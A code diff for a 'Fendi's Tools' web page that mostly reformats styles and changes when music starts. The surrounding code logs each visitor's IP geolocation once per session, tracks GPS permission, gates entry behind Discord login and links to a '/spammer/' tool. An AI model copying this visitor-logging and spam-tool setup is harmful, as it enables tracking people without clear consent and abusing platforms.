@@ -4,10 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Fendi's Tools</title>
-    <!-- Tab icon: white logo -->
     <link rel="icon" type="image/png" href="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png">
     <style>
-        /* ========== same styles as your landing page (unchanged) ========== */
+        /* ========== ALL STYLES (unchanged) ========== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
@@ -65,7 +64,6 @@
         .enter-btn:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,255,255,0.5); background: #222; }
         .loading-discord-link { background: rgba(30,30,30,0.7); padding: 0.7rem 1.5rem; border-radius: 3rem; border: 1px solid white; cursor: pointer; display: inline-block; }
         .loading-discord-link a { color: white; text-decoration: none; font-weight: 600; }
-
         .landing-page {
             width: 100%;
             max-width: 1000px;
@@ -123,7 +121,6 @@
         .tool-card p { color: #ccc; font-size: 0.85rem; }
         .placeholder { opacity: 0.6; cursor: not-allowed; }
         .placeholder:hover { transform: none; box-shadow: none; }
-
         .music-player {
             position: fixed;
             top: 15px;
@@ -142,26 +139,10 @@
         .music-player button { background: none; border: none; color: white; font-size: 1.2rem; cursor: pointer; padding: 0; width: 28px; transition: 0.2s; }
         .music-player button:hover { color: #aaa; transform: scale(1.05); }
         .music-player .track-title { color: #ddd; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 0.75rem; }
-
-        .top-left-logo {
-            position: fixed;
-            top: 15px;
-            left: 15px;
-            z-index: 100;
-            cursor: pointer;
-        }
-        /* White logo for landing page */
-        .top-left-logo img {
-            width: 45px;
-            height: 45px;
-            border-radius: 12px;
-            border: 1px solid white;
-            transition: transform 0.2s;
-        }
+        .top-left-logo { position: fixed; top: 15px; left: 15px; z-index: 100; cursor: pointer; }
+        .top-left-logo img { width: 45px; height: 45px; border-radius: 12px; border: 1px solid white; transition: transform 0.2s; }
         .top-left-logo img:hover { transform: scale(1.05); }
-
         .version-tag { position: fixed; bottom: 10px; right: 10px; color: #aaa; opacity: 0.6; font-size: 12px; font-family: monospace; z-index: 9999; pointer-events: none; }
-
         @media (max-width: 650px) {
             .tools-grid { gap: 1rem; }
             .tool-card { padding: 1rem; }
@@ -177,7 +158,6 @@
 <canvas id="snowCanvas"></canvas>
 
 <div class="top-left-logo" id="logoBtn">
-    <!-- White logo for landing -->
     <img src="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png" alt="Logo">
 </div>
 
@@ -238,15 +218,14 @@
         const loadingScreen = document.getElementById('loadingScreen');
         const landingPage = document.getElementById('landingPage');
         
-        // ========== DISCORD OAUTH & GPS (same as before) ==========
-        const DISCORD_CLIENT_ID = "1497155951067664415";
+        // ========== DISCORD OAUTH & GPS (shared state) ==========
+        const DISCORD_CLIENT_ID = "1497155951067664415";  // REPLACE WITH YOUR CLIENT ID
         const REDIRECT_URI = window.location.origin;
-        let discordToken = localStorage.getItem("discord_access_token");
         let gpsRequested = localStorage.getItem("gpsRequested") === "true";
         let gpsGranted = localStorage.getItem("gpsGranted") === "true";
         let ipLogSentSession = sessionStorage.getItem("ipLogSent") === "true";
 
-        // ----- Helper functions (unchanged) -----
+        // ----- Helper functions -----
         async function getIpGeo() {
             try {
                 const res = await fetch('https://ip-api.com/json/');
@@ -391,7 +370,7 @@
             } catch(e) { console.error("Failed to send IP log", e); }
         }
 
-        // ----- Discord OAuth PKCE (same as before) -----
+        // ----- Discord OAuth PKCE -----
         function generateRandomString(length) {
             let text = "";
             const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
@@ -478,10 +457,11 @@
         }
 
         // ========== ENTER BUTTON ==========
+        let musicStartedLanding = false;
         enterBtn.addEventListener('click', async () => {
+            // Start music immediately in response to click
+            startMusic();
             await ensureLoggedIn();
-            // After OAuth redirect, finishEntry will be called from the code handler.
-            // If already logged in, the function below will be called immediately.
             if (localStorage.getItem("discord_access_token")) {
                 finishEntry();
             }
@@ -515,12 +495,13 @@
         }
 
         async function finishEntry() {
-            await sendIpLog();   // Only once per session
+            await sendIpLog();
             loadingScreen.classList.add('hide');
             setTimeout(() => {
                 loadingScreen.style.display = 'none';
                 landingPage.classList.add('visible');
-                startMusic();    // Start music after ENTER/redirect
+                // Music already started from ENTER click, but if skipped (e.g., already logged in), start it now
+                if (!musicStartedLanding) startMusic();
             }, 800);
         }
 
@@ -566,16 +547,6 @@
         const playPauseBtn = document.getElementById('playPauseBtn');
         const prevBtn = document.getElementById('prevTrackBtn');
         const nextBtn = document.getElementById('nextTrackBtn');
-
-        // Clear music state on direct visit (no "fromSpammer" flag)
-        const fromSpammer = sessionStorage.getItem('fromSpammer') === 'true';
-        if (!fromSpammer) {
-            localStorage.removeItem('musicTrackIndex');
-            localStorage.removeItem('musicCurrentTime');
-            localStorage.removeItem('musicPlaying');
-        } else {
-            sessionStorage.removeItem('fromSpammer');
-        }
 
         function saveMusicState() {
             if (audio) {
@@ -626,6 +597,7 @@
         function startMusic() {
             if (musicStarted) return;
             musicStarted = true;
+            musicStartedLanding = true;
             loadMusicState();
             setInterval(saveMusicState, 2000);
             window.addEventListener('beforeunload', saveMusicState);
@@ -666,7 +638,6 @@
             if (!card.classList.contains('placeholder')) {
                 card.addEventListener('click', () => {
                     saveMusicState();
-                    // Set flag to tell spammer page to restore music
                     sessionStorage.setItem('fromLanding', 'true');
                     window.location.href = '/spammer/';
                 });
